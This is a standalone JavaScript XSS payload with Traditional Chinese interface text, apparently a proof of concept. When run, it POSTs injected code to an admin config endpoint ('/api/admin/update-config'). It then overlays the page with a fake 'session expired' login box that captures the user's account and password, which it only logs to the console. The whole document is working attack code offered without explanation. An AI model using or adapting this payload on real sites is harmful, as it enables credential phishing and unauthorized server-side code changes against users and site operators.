(function() {
    fetch('/api/admin/update-config', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: "code=global.serverConfig = global.serverConfig || {}; global.serverConfig.x = 'XSS_Triggered';"
    })
    .then(response => console.log('伺服器引數已變更'))
    .catch(err => console.error('伺服器請求失敗:', err));

    var overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100vw';
    overlay.style.height = '100vh';
    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
    overlay.style.zIndex = '9999';
    overlay.style.display = 'flex';
    overlay.style.justifyContent = 'center';
    overlay.style.alignItems = 'center';

    overlay.innerHTML = `
        <div style="background: white; padding: 30px; border-radius: 8px; width: 320px; text-align: center; font-family: sans-serif; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
            <h3 style="color: #ff3333; margin-top: 0; font-size: 20px;">⚠️ 系統提示</h3>
            <p style="color: #666; font-size: 14px; margin-bottom: 20px;">您的登入已逾時，請重新輸入密碼以驗證身分。</p>
            <input type="text" id="fake_user" placeholder="帳號 / 電子郵件" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
            <input type="password" id="fake_pass" placeholder="密碼" style="width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
            <button id="fake_submit" style="width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">確認登入</button>
        </div>
    `;

    document.body.appendChild(overlay);

    document.getElementById('fake_submit').addEventListener('click', function() {
        var user = document.getElementById('fake_user').value;
        var pass = document.getElementById('fake_pass').value;
        
        console.log("【XSS】資料：", { account: user, password: pass });
        
        overlay.remove();
    });
})();
